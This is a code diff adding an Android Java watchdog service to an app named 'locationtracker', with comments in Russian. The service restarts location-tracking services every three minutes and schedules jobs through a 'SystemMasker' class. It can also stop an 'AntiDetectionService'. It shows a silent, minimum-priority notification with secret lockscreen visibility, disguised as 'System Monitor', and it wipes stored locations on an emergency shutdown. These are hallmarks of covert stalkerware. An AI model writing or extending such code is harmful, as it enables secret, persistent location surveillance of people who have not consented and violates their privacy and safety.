@@ -1,0 +1,166 @@
+package com.example.locationtracker;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.os.Build;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.util.Log;
+import androidx.core.app.NotificationCompat;
+
+public class WatchdogService extends Service {
+    private static final String TAG = "SystemWatchdog";
+    private static final String CHANNEL_ID = "system_monitoring";
+    private static final int NOTIFICATION_ID = 8002;
+    private static final long WATCHDOG_INTERVAL = 180_000L; // 3 минуты
+
+    private Handler handler;
+    private Runnable watchdogRunnable;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        Log.d(TAG, "System monitoring service started");
+
+        createNotificationChannel();
+        handler = new Handler(Looper.getMainLooper());
+
+        startForeground(NOTIFICATION_ID, createNotification());
+        startWatchdog();
+    }
+
+    private void startWatchdog() {
+        watchdogRunnable = new Runnable() {
+            @Override
+            public void run() {
+                checkSystemHealth();
+                handler.postDelayed(this, WATCHDOG_INTERVAL);
+            }
+        };
+
+        handler.postDelayed(watchdogRunnable, 60_000L); // Первая проверка через минуту
+    }
+
+    private void checkSystemHealth() {
+        try {
+            // Проверяем emergency shutdown
+            SharedPreferences systemPrefs = getSharedPreferences("system_config", MODE_PRIVATE);
+            if (systemPrefs.getBoolean("emergency_shutdown", false)) {
+                Log.d(TAG, "Emergency shutdown detected, stopping services");
+                stopSystemServices();
+                stopSelf();
+                return;
+            }
+
+            // Проверяем основные сервисы
+            checkMainService();
+            checkBackupService();
+
+            // Планируем следующую задачу через JobScheduler
+            SystemMasker.scheduleSystemJob(this);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error in system health check", e);
+        }
+    }
+
+    private void checkMainService() {
+        try {
+            SharedPreferences prefs = getSharedPreferences("LocationTracker", MODE_PRIVATE);
+            if (prefs.getBoolean("auto_tracking", false)) {
+                Intent serviceIntent = new Intent(this, LocationService.class);
+                String deviceId = prefs.getString("device_id", "");
+                String deviceName = prefs.getString("device_name", "Unknown_Device");
+
+                serviceIntent.putExtra("device_id", deviceId);
+                serviceIntent.putExtra("device_name", deviceName);
+                serviceIntent.putExtra("watchdog_restart", true);
+
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(serviceIntent);
+                } else {
+                    startService(serviceIntent);
+                }
+
+                Log.d(TAG, "Main service health check completed");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error checking main service", e);
+        }
+    }
+
+    private void checkBackupService() {
+        try {
+            Intent backupIntent = new Intent(this, BackupLocationService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(backupIntent);
+            } else {
+                startService(backupIntent);
+            }
+            Log.d(TAG, "Backup service health check completed");
+        } catch (Exception e) {
+            Log.e(TAG, "Error checking backup service", e);
+        }
+    }
+
+    private void stopSystemServices() {
+        try {
+            stopService(new Intent(this, LocationService.class));
+            stopService(new Intent(this, BackupLocationService.class));
+            stopService(new Intent(this, AntiDetectionService.class));
+
+            // Очищаем pending locations при emergency shutdown
+            SharedPreferences pendingPrefs = getSharedPreferences("pending_locations", MODE_PRIVATE);
+            pendingPrefs.edit().clear().apply();
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error stopping system services", e);
+        }
+    }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    CHANNEL_ID,
+                    "System Monitoring",
+                    NotificationManager.IMPORTANCE_MIN);
+            channel.setShowBadge(false);
+            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
+        }
+    }
+
+    private Notification createNotification() {
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
+                .setSmallIcon(android.R.drawable.stat_sys_warning)
+                .setContentTitle("System Monitor")
+                .setContentText("Monitoring system health")
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                .setOngoing(true)
+                .setSilent(true)
+                .build();
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    @Override
+    public void onDestroy() {
+        if (handler != null && watchdogRunnable != null) {
+            handler.removeCallbacks(watchdogRunnable);
+        }
+        super.onDestroy();
+    }
+}
